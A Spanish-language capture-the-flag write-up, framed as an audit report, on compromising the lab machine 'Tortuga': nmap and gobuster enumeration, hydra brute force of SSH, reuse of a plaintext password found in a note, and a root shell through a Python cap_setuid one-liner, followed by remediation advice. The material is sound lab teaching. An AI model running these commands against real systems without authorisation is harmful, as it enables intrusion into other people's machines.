Informe Técnico de Auditoría: Máquina "Tortuga"

Fecha: 11 de Diciembre, 2025 Plataforma: The Hackers Labs Objetivo: Comprometer el sistema, obtener acceso inicial (user.txt) y escalar privilegios hasta el administrador (root.txt). Clasificación: Boot2Root / CTF
1. Resumen Ejecutivo

Durante la auditoría realizada a la máquina Tortuga (192.168.77.67), se identificaron vulnerabilidades críticas debidas a la exposición de información sensible y configuraciones inseguras de privilegios.

El vector de entrada principal fue la fuga de información (Information Leakage) en el servidor web, que reveló nombres de usuarios válidos. Esto permitió un ataque de fuerza bruta exitoso contra el servicio SSH. Posteriormente, se logró la escalada de privilegios horizontal mediante credenciales en texto plano encontradas en archivos locales, y finalmente una escalada vertical a root explotando una Capability de Linux mal configurada en el binario de Python.
2. Fase de Reconocimiento y Enumeración

El primer paso consistió en identificar los servicios expuestos en la máquina objetivo para definir la superficie de ataque.
2.1 Escaneo de Puertos (Nmap)

Se utilizó nmap para descubrir puertos abiertos y versiones de servicios.

Comando:
Bash

nmap -sC -sV 192.168.77.67

    -sC: Ejecuta scripts por defecto (detecta vulnerabilidades comunes y configuraciones).

    -sV: Intenta determinar la versión del servicio.

Salida Obtenida:
Bash

Nmap scan report for 192.168.77.67
Host is up (0.00011s latency).
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
MAC Address: 08:00:27:07:CD:5C (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    Análisis: La máquina expone un servidor web (Apache) en el puerto 80 y un servicio de acceso remoto (SSH) en el puerto 22. La estrategia a seguir es investigar la web en busca de vulnerabilidades o información que nos permita atacar el SSH.

2.2 Enumeración Web (Fuzzing)

Dado que el puerto 80 estaba abierto, se procedió a enumerar directorios y archivos ocultos utilizando gobuster. Esta técnica ayuda a encontrar paneles de administración, archivos de configuración o pistas olvidadas por los desarrolladores.

Comando:
Bash

gobuster dir -u http://192.168.77.67 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -t 50 -o scans/gobuster-tortuga.txt

Salida Relevante:
Plaintext

/index.html           (Status: 200) [Size: 1440]
/mapa.php             (Status: 200) [Size: 922]
/tripulacion.php      (Status: 200)
/server-status        (Status: 403) [Size: 278]

2.3 Análisis de Fuga de Información (OSINT Local)

Al inspeccionar manualmente los archivos descubiertos, encontramos información crítica filtrada en el código y el contenido visible.

Archivo /mapa.php: Contenía un mapa ASCII y un mensaje directo:

    "Ey grumete revisa la nota oculta que dejado en tu camarote..."

Archivo /tripulacion.php: Listaba posibles roles y usuarios:

    Capitán Barbanegra

    Grumete Verde

    Timón de Hierro

    Insight Profesional: En ciberseguridad, esto se conoce como reducción de la entropía. En lugar de atacar con miles de usuarios genéricos (admin, root, user), ahora podemos enfocar nuestros ataques a un usuario específico confirmado: grumete.

3. Fase de Explotación (Acceso Inicial)

Con el usuario grumete confirmado, la hipótesis de ataque fue que este usuario podría tener una contraseña débil, algo común en entornos de prueba o usuarios con bajos privilegios.
3.1 Ataque de Fuerza Bruta (Hydra)

Se utilizó hydra para probar contraseñas contra el servicio SSH.

Comando:
Bash

hydra -l grumete -P /usr/share/wordlists/rockyou.txt ssh://192.168.77.67 -t 4 -o scans/hydra-ssh-tortuga.txt

Resultado Exitoso:
Plaintext

[22][ssh] host: 192.168.77.67   login: grumete   password: 1234

3.2 Acceso SSH

Con las credenciales obtenidas (grumete:1234), accedemos al sistema.

Comando:
Bash

ssh grumete@192.168.77.67

Una vez dentro, listamos los archivos y encontramos la primera bandera (user.txt) y una nota oculta.

Evidencia (user.txt):
Bash

grumete@TheHackersLabs-Tortuga:~$ cat user.txt
############################

4. Movimiento Lateral (Escalada Horizontal)

A menudo, el primer usuario comprometido no tiene privilegios suficientes. El siguiente paso es buscar cómo moverse a otro usuario con más poder.
4.1 Análisis de Archivos Locales

En el directorio del usuario grumete, encontramos un archivo oculto llamado .nota.txt.

Contenido de .nota.txt:
Plaintext

Querido grumete,
...
La puerta de la cámara del timón está asegurada con la contraseña: 
    "mar_de_fuego123"  
...
— El Capitán

Esta nota revela una contraseña en texto claro (mar_de_fuego123) asociada al "Capitán" o la "cámara del timón".
4.2 Cambio de Usuario

Probamos esta contraseña para cambiar al usuario capitan.

Comando:
Bash

su capitan
# Contraseña: mar_de_fuego123

O conectando directamente por SSH:
Bash

ssh capitan@192.168.77.67

Validación de acceso:
Bash

capitan@TheHackersLabs-Tortuga:~$ whoami
capitan

5. Escalada de Privilegios (Root)

Ahora, como usuario capitan, el objetivo es obtener control total (root).
5.1 Enumeración de Capabilities

En Linux, las Capabilities permiten a un binario realizar acciones de superusuario sin ser setuid root completo. Buscamos binarios con capacidades peligrosas usando getcap.

Comando:
Bash

getcap -r / 2>/dev/null

    -r: Búsqueda recursiva.

    2>/dev/null: Oculta errores de permisos.

Salida Crítica:
Plaintext

/usr/bin/ping cap_net_raw=ep
/usr/bin/python3.11 cap_setuid=ep

    Explicación Técnica: La capacidad cap_setuid=ep en /usr/bin/python3.11 es extremadamente peligrosa. Significa que el binario de Python tiene permiso para manipular su propio Identificador de Usuario (UID). Un atacante puede invocar Python y decirle que cambie su UID a 0 (root).

5.2 Explotación de Python Capability

Creamos un pequeño script en una sola línea (one-liner) que importa la librería del sistema operativo, cambia el ID del usuario a 0 (root) y lanza una nueva terminal.

Comando de Explotación:
Bash

/usr/bin/python3.11 -c 'import os; os.setuid(0); os.system("/bin/bash")'

5.3 Confirmación de Root

Al ejecutar el comando, el prompt cambia, indicando que somos el superusuario.

Salida:
Bash

root@TheHackersLabs-Tortuga:~# whoami
root
root@TheHackersLabs-Tortuga:~# cd /root
root@TheHackersLabs-Tortuga:/root# cat root.txt
############################

6. Recomendaciones y Remediación

Como parte del informe profesional, se sugieren las siguientes acciones para asegurar el sistema:

    Limpiar Metadatos Web: Eliminar cualquier referencia a nombres de usuarios reales (grumete) o pistas operativas en el código HTML público (/mapa.php, /tripulacion.php).

    Fortalecer Autenticación:

        Cambiar la contraseña débil del usuario grumete (1234).

        Deshabilitar el acceso por contraseña en SSH y usar solo claves pública/privada.

    Gestión de Secretos: Nunca almacenar contraseñas en archivos de texto plano como .nota.txt. Usar gestores de contraseñas o variables de entorno seguras.

    Principio de Mínimo Privilegio: Eliminar la capability cap_setuid del binario de Python, ya que no es necesaria para su funcionamiento normal y representa un riesgo crítico.

        Comando de corrección: setcap -r /usr/bin/python3.11
